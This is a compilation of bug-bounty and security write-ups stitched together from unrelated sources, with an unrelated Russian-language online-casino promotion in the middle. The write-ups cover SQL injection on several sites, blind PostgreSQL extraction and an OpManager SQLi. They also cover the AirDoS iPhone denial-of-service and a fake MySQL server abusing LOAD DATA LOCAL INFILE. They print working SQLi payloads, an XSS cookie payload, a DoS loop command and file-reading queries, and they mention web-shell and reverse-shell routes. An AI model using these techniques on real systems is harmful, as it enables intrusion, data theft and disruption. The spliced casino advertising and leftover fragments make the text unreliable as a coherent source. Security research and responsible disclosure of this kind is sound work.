Actualy while testing on a subdomains , related to razer company called “ rsa3072.razersynapse.com “ going to access /admin page → page 200 → redirects again to the login page , Decided to stop the redirection using an known extention named “Noredirect” , and here is what i got exactly ( See the image down )! Press enter or click to view image in full size Actulay this is a bypass for the /admin part ! we got many sensitive data like game Keys , Emails , users creds ,.. After that i decided to search for more links , maybe there will be something interesting ! Access’d a game link , looks like → /source-data/view?source_data_id=[id ] tried to inject (‘) after the id , got a 500 inernal server error ! Tried a sql injection command to see if the response with return to 200!, the first thing i tried is order by 1- -, and yes i was right! the page returned 200 ok. So i decided to use sqlmap for auto detecting the type of injection and for easy injecting ! Here is a small picture to show the final injection with sqlmap , Never forget to stopp the redirection while injecting with sqlmap tool ! cuz it will automatiquuely redirects you to login page ! so no injection can be performed there!

Hey! Everyone I know its been a long time Since I last posted an article. so Today I am writing about a tricky SQL Injection that I was able to exploit in a private program. It was an in-scope subdomain which I got by using passive recon and the technology stack was basically PHP so I knew it had to be vulnerable at some point. so the functionality was like, There was an ability to create Image albums and inside an album, you could have uploaded various Images but there was Pagination ie. Only a few numbers of albums were visible on a Page and You need to click Page numbers to view other albums. While clicking at the Page numbers I noticed the request was like: /albums.php?page=2&num_max=20 It added num_max parameter which was nothing but told the limit of albums per page we could have increased or decreased it to increase the number of albums on a single Page. so I tried to check for SQL Injection by simply putting ’ \" and \\ etc. and It threw the SQL query in the response. Also, the error revealed that it was PostgreSQL DBMS. Query Looked Something like this: Select * from tbl_albums where page=2 order by album_date asc LIMIT 0,{{INPUT}} Where in Limit 0,{{input}} 0 is the offset ie. from which row to return records and {{input}} is the number of rows that should be returned from the offset and can also be written as LIMIT {{INPUT}} OFFSET 0 The application was escaping quotes. However, since I also used \\ to check and since the injection was in numeric context It caused an error. Select * from tbl_albums where page=2 order by album_date asc LIMIT 20\\ OFFSET 0 As far as I know, when Order by query is used along with LIMIT Clause we can’t use UNION Clause to inject our own row into the currently running query. It was possible to do error based Injection in case of MySQL but It was PostgreSQL DBMS this time. I tried to search a lot for workarounds this but found none. Another thing that was possible was, Stacked/Batched Queries but sadly even ; (semi-colon) was escaped and I couldn’t inject that as well. Soon after this, I contacted my friend none other than @securityidiots and he came up with an amazing trick which I’m going to share right now. Although it was application dependent It could be possible at various other places. Exploit First of all, using Burp Intruder I created around 200 Albums (you will know below that only 127 was needed but why not!) I decided to first extract the first character of the DBMS Version so I used inbuilt substr function and put my SQL Query inside it such that it became Select * from tbl_albums where page=2 order by album_date asc LIMIT 0,substr((select version()),1,1) but obviously it threw an error because the DBMS expects the value of LIMIT and OFFSET to be numeric! Next, we used \" ascii \" function to convert the result of the substr function to a number so the query looked something like Select * from tbl_albums where page=2 order by album_date asc LIMIT 0,ascii(substr((Select version()),1,1)) Now the query was perfectly fine and returned no errors, now what this query will do is, return that number of albums which is equivalent to the ascii value of first character of version() function’s output. That was the reason to create so many albums in the step #1 since the result would be in the range of 0-127. Example: If the output of version() was PostgreSQL 9.6.2 then substr((select version()),1,1) would be “P” ascii(substr((select version()),1,1)) would be \" 80 \" Therefore, only 80 albums would be returned to the page substr((select version()),2,1) would be “o” ascii(substr((select version()),2,1)) would be \" 111 \" only 111 albums would be returned to the page and Similarly, we can move ahead. so all we have to do now is count the number of albums returned in the DOM using some javascript and convert the count of albums back to the equivalent Character in ASCII Table and we got our first character of (select version()) and similarly we could go further to extract all DBMS by automating it. I used document.querySelectorAll('.ALBUM_CLASS').length to find the number of albums returned and Converted them back to Character using String.fromCharCode(80) Though, this was enough for the POC.

It was fixed quite fast by the development team and a new version 12.4 (Build no 124089) was released on October 3rd ( CVE-2019–17602 ). This is a short story how I found this bug from a methodological perspective, especially regarding white-box analysis. In the last months I started to shift my focus from black-box testing to a more white-boxed approach. Reading code not only makes fun but rather gives insight into a more detailed understanding of bugs as well as a chance to find bugs with quite some preconditions. Since Java (and other languages of course) “compiles” into byte-code, it can easily be decompiled back into it’s source. So I downloaded (more or less randomly) the latest ManageEngine OpManager from their website and decompiled all JAR files for a deeper white-box analyses. So besides decompilation of code, how is a standard Java web application structured? From an attacker’s perspective there is not only code but also configuration files (.xml, .properties, etc.). Especially, for Java web applications several configurations are done within the file web.xml . For a deployed web application, it’s usually stored in the protected WEB-INF directory. So how could this file help us? E.g. one can read how Java files/classes are used and mapped to URLs. Of special interested to us are so called Servlets . These special classes have methods like doGet or doPost which are executed for every request matching their URL mapping pattern defined in web.xml . So the methodology tells us to go through all Servlets, look (at least) at their do* methods and find some vulnerabilities from there. This approach is somehow top-down, from user-controlled input to bad things in the backend. After digging into some Servlets, I found one called OPMDeviceDetailsServlet . The web.xml file told us that it’s URL maps to /servlet/APMExtAlertsInteg . Press enter or click to view image in full size And this is were white-box analysis comes into play. We can follow the control flow step-by-step which easily allows us to submit proper parameters per request, fulfilling several conditional branches observable in the source code. Here, we see the Servlet entry point calling the doPost methods. The Servlet can be called from and unauthenticated and authenticated perspective which makes it more or less critical . For this article we concentrate on the authenticated part. Press enter or click to view image in full size We observe that the allow variable has to be true such that with a proper combination of Servlet URL parameters, one could reach the code of the getXMLFileforAllDevices method. Namely, the fetchType parameters has to be set to the value deep , and userName , password and domainName have to be set accordingly. The timeVal parameters does not have to be set explicitly since if it is null , it is set to All programmatically. In the end, the getAllMOs method will be called. Press enter or click to view image in full size Now, the getAllMO method is used to build and execute an SQL query parameterized with category . Since this SQL query is built dynamically via String concatenation, malicious code could be injected easily. Press enter or click to view image in full size The exploitation step is as simple as injecting something like …&category=nocategory’); [NEW QUERY — . The screenshots below show a simple example of a pg_sleep(10) selection. Since the bundled database usually is PostgreSQL, stacked queries make injection easy and with e.g. help of COPY TO commands a web shell could be written. UDF reverse shells would also be possible, i.e. Remote Code Execution is just a matter of small additional effort and left to the interested reader. Press enter or click to view image in full size Press enter or click to view image in full size Additionally, the encryption routine for the username and password had to be re-implemented for a proper decrypt call at the Servlet’s entry point. Since the key is fixed (not good!), the routine was re-implemented quickly. Overall, this short article should make you being interested in a white-box analysis approach if you get a chance to access code. Instead of fuzzing parameters, sometimes a short code analysis can reveal a straight-forward exploitation. From beginning of code reading to a first successful exploitation, it took me approx. an hour (and I’m far from being an expert!). I hope you enjoyed this walk-through of this very recent and real-world example how to find a critical bug in well-known product. It’s as easy as that!

Enumeration Phase First, try to test the normal behavior of any function before starting to manipulate the input parameters or thinking of how to abuse it, this will make your hunting life much easier and identify the bugs much faster. Testing the normal behavior by submitting an already existed user email and the response was Press enter or click to view image in full size And when submitting an email like “idontexist@test.com” the response was Press enter or click to view image in full size Now the time comes for our SQLi testing. first, I tried to end my input with a single quote and the response was “Unable to access data” which was very suspicious. Knowing that when single quote repeated twice is treated as a literal character, not a special one, I ended my input with two single quotes like [ test@test.com ’’ ], Then we had the normal response of the non-existed mail and this was close to prove that this function is vulnerable to SQLi. Also, this clarifies the importance of understanding the application’s behavior and normal response messages. One of the most important web application enumeration steps is to identify the back-end language and technologies and this sometimes leads to expecting the DBMS engine. From web page extensions like “RetrievePassword.aspx”, the pentester identified that back-end language is “ASP.NET” which always comes with MSSQL server as a DBMS engine. This little piece of information made the exploitation very easy to craft targeted payloads. Exploitation Phase: The basic SQLi exploitation steps are to break the query which we did with single quotes then fix the query with a comment character, then inject anything in between. After trying a couple of payloads and special characters we were able to inject and fix our query with a payload like the following one [ test@test.com ’) — ] Now I can finally exploit this SQLi vulnerability and started with a simple technique called “Time-Based” which delays the database server responses with a specific amount of time. (WAIT FOR DELAY ‘hh:mm:ss’) is a MSSQL function that suspends the execution for the specified amount of time as a PoC I was able to delay database server responses up to 30 seconds using the following payload [ anyInput’) WAITFOR DELAY ‘0:0:30’ — ] Attack Automation: Since it’s a Time-Based SQLi, it’s very hard to make the exploitation and data exfiltration manually and here “SQLMap” comes to rescue to automate this process. Submit this vulnerable request and intercept it with “Burp Suite” proxy tool, replace the “E-mail” value with an “*” to be detected by SQLMap as a custom injection point, and save this request. After a couple tries with SQLMap options, the final command that was used to exploit this SQLi and extract the Database names was: Press enter or click to view image in full size Press enter or click to view image in full size The next steps are to identify the application database then tables and columns then dump data of the juicy columns like usernames, emails, and passwords which were saved as a clear-text format.

First of all, I will leave “blur” in the sensitive parts as it was requested from the customer of the private program. After authenticating in the application I came across the following request: Press enter or click to view image in full size After, try several things .. and application always return “OK” in the response .. I put a single quote (‘) in the U ser-Agent Header .. result, instead of the application return 200 OK, returned 401 .. as demonstrated below: Press enter or click to view image in full size Next step was trying to exploit some SQL injection payloads, after a few tries it sees that the application was vulnerable to a type of SQL injection Boolean based . Putting the tests into practice, when the payload ‘ AND’ 1 ‘=’ 1 was inserted into the User-Agent the application returned 200 OK, when the payload ‘ AND’ 1 ‘=’ 2 was entered the application returned 401. The images below illustrate the fact: Press enter or click to view image in full size Press enter or click to view image in full size After confirming that the application was vulnerable, the next step was to try to verify which version of the database the application was using. For this, I have tested functions of the Oracle , MySQL , MicrosoftSQL etc. databases. Finally, through the payload ‘ and substring(@@version,1,1)=1=’1'’, it was possible to identify that the database was MySQL or MariaDB. The images bellow show the fact: OBS: if you don’t know what the function substring here you can found :) Press enter or click to view image in full size Press enter or click to view image in full size After iterates the values of substring function i got the version i it was 10.1.21 Mariadb. A cool trick when you find a Boolean based , is to test if there is a possibility of using a “ subselect ”, in my case it was possible. Press enter or click to view image in full size To get the name of the table, it is necessary to make a wordlist with some familiar names and it is also cool, to make a wordlist with the name of the company. Through the following payload ‘ AND (select 1 from “WORDLIST” limit 0,1)=1+‘ , it was possible to get the name of the table “ app_user ”, see that in the image the below is returned 200 OK in the response of the server. Press enter or click to view image in full size Now, that we have the name of the table, we go behind the name of the columns so we can get the user and the password. In the same way that it was exploited to get the table name, an attempt / error is also used here with common names used in colums such as user, password, user_pass, passwd, etc. The following images illustrate the name of the retrieved columns. Press enter or click to view image in full size Press enter or click to view image in full size Finally, the following payload looks for the “password” column in the “app_user” table where the user id is equal to ‘X’ and brings the user password in the application. Press enter or click to view image in full size Return 200 “OK” for user id 971 Press enter or click to view image in full size Return 401 for user id 972 This is all personal, I can not show the rest with the passwords in the application because it would violate some terms :) any doubt we are together.

Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается.

Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита.

Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций.

Sunil Yedla 2 min read · Mar 10, 2019 -- 2 Listen Share Hey guyzz …!!! I hope you all are doing well. Today I’m fully disclosing a PoC demonstration along with some brief documentation of this exploit. This is a writeup of bug which I found in one of the private programs of Hackerone. Since it is a private program i can’t disclose the name of the program(please note that, i will be referring the program name as : “ Redacted ” throughout this article). I found SQL injection, in one of their endpoints: “/rest/aom/index?id=” I’ve been investigating this program since many days and i always end up finding low severity bugs. One day while while loading a url : https://www. redacted .com/aom?utm_source=Frontpage&utm_medium=banner%20popup&utm_campaign=Frontpage%20popup%20June17%20AOM , found an endpoint where I’ve seen id parameter. Old/Basic trick ( ‘ after the ID value ) worked and that is how i found my first sql injection 2 years ago. Below are the complete steps of reproduction. Steps to reproduce : loaded the url : https://www. redacted .com/aom?utm_source=Frontpage&utm_medium=banner%20popup&utm_campaign=Frontpage%20popup%20June17%20AOM in mozilla firefox broswer. Click on the “ FOLLOW “ and capture the requests in Burpsuite. Now you will get many request followed by host : https:// redacted .com , wait for the right endpoint. I found an endpoint like this: GET /rest/aom/index?id=3 HTTP/1.1 Host: www. redacted .com User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br X-Requested-With: XMLHttpRequest Referer: https://www. redacted .com/aom?utm_source=Frontpage%22%3E%3Cscript%20%3Ealert(document.cookie)%3C/script%3E&utm_medium=banner%20popup%22%3E%3Cscript%20%3Ealert(document.cookie)%3C/script%3E&utm_campaign=Frontpage%20popup%20June17%20AOM%22%3E%3Cscript%20%3Ealert(document.cookie)%3C/script%3E Cookie: __utma=155410345.398014507.1478469081.1478469081.1478724130.2; _ga=GA1.2.398014507.1478469081; aom_popup=1; thumbnail_size=large; __stripe_mid=414d123e-85b7–4737-a479–7693beba627c; _gid=GA1.2.1421519450.1497256887; PHPSESSID=3celt75q8oh51e2jjkdl86iihjo7t3bcrh0lilfauq7odi5behjavnd8i3hsrog6ek1lb437uvu6pv3c8qd2jalt0l1jkjekl93a8f1; language=en; heartbeat=1497297643; _gat=1 Connection: close 5. The very basic check for confirming if a site is vulnerable to SQL Injection is by keeping : ‘ after id value. That is exactly what i did. 6. Now, Server response is like this : {“message”:”SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’) LIMIT 1' at line 1, query was: SELECT aom_campaign .* FROM aom_campaign WHERE (id=3') LIMIT 1\"} 7. I have confirmed that this is not browser or device specific and proceeded with submission. They awarded me a bounty of $50 and 15 points and HOF. yeah i do think $50 was low for a SQL injection but knowing the fact that the minimum bounty of this program is only 10$, I was okay with it. BTW I found another sql injection on the same day in another endpoint which awarded me the same amount.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAirDoS: Remotely render any nearby iPhone or iPad unusable AirDoS: Remotely render any nearby iPhone or iPad unusable What if you could walk into a room and make every* iPhone or iPad unusable while you're there? Wait, that sounds evil. What if you could get that one annoying person off their iPhone who's always on it? I discovered a denial-of-service bug in iOS that I'm calling AirDoS which lets an attacker infinitely spam all nearby iOS devices with the AirDrop share popup. This share popup blocks the UI so the device owner won't be able to do anything on the device except Accept/Decline the popup, which will keep reappearing. It will persist even after locking/unlocking the device. *This bug is still subject to the AirDrop receiving setting, meaning if your AirDrop setting is set to \"Everyone\", anyone can be the attacker, but if it's set to \"Contacts Only\", only someone in your contacts can be the attacker. How would you stop this if someone were to use this attack on you? Simply run away! It'll get you out of range from the attacking device. Okay, I'm not sure how well this'd work in an airplane. Besides getting away from the attacker, who is also unidentifiable most of the time, you can stop this by turning off AirDrop/WiFi/Bluetooth. This can be done if you can access Control Center from the lock screen but not if you have it disabled. Either way, you can ask Siri to turn off WiFi or Bluetooth. Restarting your device may also give you some time to turn AirDrop off before the attack takes place again. To prevent this attack from taking place at all, turn on AirDrop only when you need it and don't ever keep it set to \"Everyone\". I reported this bug to Apple in August 2019. It's been fixed in iOS 13.3 with a rate limit (after declining the same device 3 times, iOS will automatically decline any subsequent requests). I've posted my PoC exploit on GitHub . It supports multiple devices but deliberately doesn't support devices that have their AirDrop receiving setting set to \"Contacts Only\" to reduce the impact of publicly posting the exploit. Huge thanks to Milan Stute and Alexander Heinrich, for authoring opendrop which powers the exploit and which originally inspired me to try this out (literally found it after five minutes of playing with opendrop). This is a simple bug and can also be exploited for a single device with a simple infinite loop and opendrop: while true ; do opendrop send -r 0 -f totally-random-file ; done macOS macOS shows the AirDrop share popup differently than iOS and doesn't block the UI. An attacker could still send a lot of share requests to spam someone but since the UI is non-blocking, they can easily turn off AirDrop or WiFi/Bluetooth. Here's a video of how it looks like on macOS. A fix for this has been implemented in macOS Catalina 10.15.2, Security Update 2019-002 Mojave and Security Update 2019-007 High Sierra.

Think again. You may expose the client to LFI vulnerability via MySQL client feature . Recently I found a public webpage that was used to connect to a remote MySQL database, from a bug bounty program. User was able to input server address, username, password in the webpage and do some (restricted) administrative things like issue some predefined SQL queries. The page was always connecting to a MySQL port (3306/TCP) and the web UI was pretty limited and well done, so nothing really exploitable there, unfortunately. I setup my own test server with MySQL service running and tried to connect to it, but nothing fancy there either. Output from the database was pretty well sanitised and pretty much only thing that would have been possible was XSS that would have needed a lot of steps to perform. Must Try Harder. Since the MySQL server always first sends a banner to the connecting client, I decided to do some digging if that would at least cause an XSS that would require less steps to perform. For fun and giggles, I decided to write a fake MySQL server that would do the authentication etc. steps needed for the client to connect and would serve some malicious content automatically to the server. I never got there. While researching the subject, I found that the MySQL client has a nice, well documented, feature “LOAD DATA” and with “LOAD DATA INFILE” the client actually loads a file from the CLIENT machine and sends it to the server, weird. And Awesome. And weird, really weird. It is very strange how this kind of feature that is so easily exploitable, is still open. Some more research (=google for teh win) revealed that this has been exploited before, (articles dating back all the way to 2013!) and there is some good writeups of this already (links at the end of this post). But I wanted to do this myself, so… I launched a wireshark and recorded the client – server login traffic from a real use case so I could check the data between the client and server. Checking this was pretty easy, since the clients and server traffic is easily readable ASCII. The image above is from the traffic when user logs in to the MySQL server and selects database. As we can see from the image below, the traffic is pretty easily readable. From the packet #29 “ Login request user=teamrot ” (image below) we can also see that our client supports “ LOAD DATA LOCAL ”. If this is not set, this won’t work. We could also use the following SQL query from the website itself: LOAD DATA LOCAL INFILE '/etc/hosts' INTO TABLE disobey.test FIELDS TERMINATED BY \"\\n\" From here on out, it was pretty much parsing the correct stuff from the .pcap and send them to the client in following order: Greeting Auth Ok Payload This was the fun part. No matter what the client sends to the server, we just send back “Auth OK” packet and the client thinks it is authorised. After authorisation packet, the payload is send. Now the client thinks it is authenticated and does what the server tells it to do. Yay(?). Actually, this was also the scary part, malicious attacker could just setup a fake MySQL server and trick clients to connect to it and vóila, attacker gets files, uhh…Anyway, moving on… Here is corrects parts parsed from the .pcap. #1 Auth OK 0000 b0 35 9f 44 95 a3 08 00 27 19 f2 99 08 00 45 00 °5.D.£..'.ò...E. 0010 00 3f f9 5e 40 00 40 06 2c c0 0a 00 00 3d 0a 00 .?ù^@.@.,À...=.. 0020 00 5e 0c ea ce 64 05 79 a6 55 f5 b2 1e 7b 80 18 .^.êÎd.y¦Uõ².{.. 0030 00 eb fd 46 00 00 01 01 08 0a 00 b2 5c ab 1a 89 .ëýF.......²\\«.. 0040 49 a8 07 00 00 02 00 00 00 02 00 00 00 I¨........... #2.

It’s weird how this kind of “feature” is still so open. This could be easily used to steal files from the victim, use as a LFI to steal files from the server etc. The “LOAD DATA LOCAL” – feature is enabled by default (usually), so you may want to check if you can disable the feature. This of course means that if you let users to set another MySQL server and/or connect from your computer to some MySQL server, there may be attacker that will be able to read your files… Tested with: PHP 7.0.32-0ubuntu0.16.04.1 (cli) ( NTS ) mysql Ver 8.0.13 for osx10.14 on x86_64 (Homebrew) mysql Ver 14.14 Distrib 5.7.24, for Linux (x86_64) Links to source materials: https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f https://dev.mysql.com/doc/refman/5.7/en/load-data.html Archives Meta Log in Entries feed Comments feed WordPress.org Pages Abusing MySQL clients to get LFI from the server/client Development projects How to install Nokia N900 web interface How to install OpenWRT to TP-Link WR841ND Kenko Extension tube + Canon 18-55mm kit lense Nokia N900 web control interface Unofficial Anvia Watson XBMC plugin Exploiting badUSB/Digispark + meterpreter payload Hacking Attacking locked computers with Poisontap Backdooring TP-Link WR841ND WiFi router Cracking WPA2 password Evading Antivirus softwares Offensive Security Certified Expert (OSCE) – No pain, no gain!

Me Back with a New Post This One is about an Authentication Bypass Vulnerability in one of the subdomains of https://zol.co.zw/ ZOL Zimbabwe and Then got an XSS following with an SQLi in that Control Panel. So The Main Focus of this Blog Post will be on How i got access to the CP and then How i Got the XSS Following the SQLi So fast Forward I got a Subdomain of the site that was http://psizimll2.zol.co.zw/ and the Subdomain was Showing the Default IIS7 Page Like in the Picture Below So At First I started testing this Subdomain for 2 Of the Most Common issues Found in IIS7 1) Microsoft IIS Tilde Vulnerability (And the Site was Vulnerable to this issue) 2) HTTP.sys DOS & possible RCE but after testing these Common Issues on the subdomain i got nothing and decided to dig deeper. So i searched the subdomain on Google to see if there is any information about this particular subdomain (Most of the time a simple google search gives you some files or folders ) But negative i got nothing i did go through virustotal & Some other webs like web archive to get some information but nothing. After this the next phase of my testing was to use DirBuster & DirScanner to test Further for any possible Files/Folders and after a while i got Some URLs Like http://psizimll2.zol.co.zw/test.php http://psizimll2.zol.co.zw/info.php http://psizimll2.zol.co.zw/cp.php The 2 Pages test.php and info.php were both leaking Some Information Through phpinfo(); Pages So At this Point i had 2 Issues in that Subdomain…. Now When Ever I went to the URL http://psizimll2.zol.co.zw/cp.php i got redirected to the main page of the subdomain that was http://psizimll2.zol.co.zw/ So as Many of you guys know about some redirect based techniques, Like This NoRedirect one i added the URL cp.php to the FireFox Extension called NoRedirect and Then When i went to the URL http://psizimll2.zol.co.zw/cp.php it did;t redirected me to http://psizimll2.zol.co.zw/ and i had Access to http://psizimll2.zol.co.zw/cp.php that looked like a Control Panel for some sort of webapp that have some users data in it. Now I searched for Some Data and it was a User Information Database of some sort while searching In It I got another Page that was http://psizimll2.zol.co.zw/dnpc.php and this Page got data of users function where i can search user data from particular dates while searching a POST request was send to the file /dnpc.php with post data as Submit2=Go&end_dt1&start_dt=10 And I saw that the anything that we add to the perimeters end_dt or start_dt was reflecting back in the page under a <th></th> tag so i added a simple Image XSS Payload and it was reflected to me under the <th></th> tag and the XSS payload was executed And I would Like to Mention That due to some error the Search Input was Saved on this Page so It became a Stored XSS 🤣 Now It was getting Bored So i Decided to Write the Report to the team and suddenly decided to look for One last issue that can make the report look better So at the same Endpoints in the same POST request as Above i simply changed searched for 1′ Submit2=Go&end_dt1&start_dt=10 as I started looking for an SQL Injection Issue aND boom the Response for this request gave me an Error Could not get htccc data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”’ at line 1 And So I did Exploit this issue to Get the Basic Info and Tables and then i was Convinced i should Stop Further Tests on this Subdomain and Report the issue Furthermore the ZOL team Patched these Issues by Deleting files and Blocking access to the Subdomain 👏 Thanks for Reading this guys 🙂 Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading...

